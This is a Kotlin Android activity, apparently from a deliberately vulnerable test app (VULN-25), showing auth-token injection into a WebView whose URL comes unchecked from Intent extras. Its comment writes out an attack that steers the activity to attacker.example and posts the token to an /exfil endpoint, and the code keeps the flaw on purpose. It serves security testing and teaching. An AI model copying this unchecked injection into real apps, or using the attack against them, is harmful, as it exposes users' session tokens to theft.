package com.masttest.vuln25

import android.annotation.SuppressLint
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

/**
 * VULN-25: Token injection в WebView без проверки origin.
 *
 * Шаблон из vault'а (WB Partners, WB iOS, Magnit и др.):
 *   - URL для загрузки приходит из Intent extras / deeplink
 *   - сразу после `loadUrl` приложение через `evaluateJavascript`
 *     инжектит auth-token в DOM (для авто-логина в web-страницу)
 *   - НИКАКОЙ проверки, что URL — наш домен, нет
 *
 * Атака:
 *   val i = Intent().apply {
 *     component = ComponentName(
 *       "com.masttest.vuln25",
 *       "com.masttest.vuln25.WebViewActivity"
 *     )
 *     putExtra("url", "https://attacker.example/grab.html")
 *   }
 *   startActivity(i)
 *
 *   На странице attacker.example:
 *     setTimeout(() => {
 *       fetch("/exfil", { method: "POST", body: JSON.stringify({
 *         token: window.__authToken
 *       })})
 *     }, 500);
 */
class WebViewActivity : AppCompatActivity() {

    private val authToken = "eyJhbGciOiJIUzI1NiJ9.fake.fake"

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)

        val web: WebView = findViewById(R.id.web)
        web.settings.javaScriptEnabled = true

        // Берём URL из Intent extras без проверки.
        val url = intent.getStringExtra("url") ?: "https://app.example.com/profile"

        web.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String?) {
                // <-- VULN sink: инжектируем токен в любой только что
                // загруженный URL, не сверяя host'а.
                view.evaluateJavascript(
                    "window.__authToken = '$authToken'; " +
                    "window.dispatchEvent(new Event('app-token-ready'));",
                    null
                )
            }
        }
        web.loadUrl(url)
    }
}
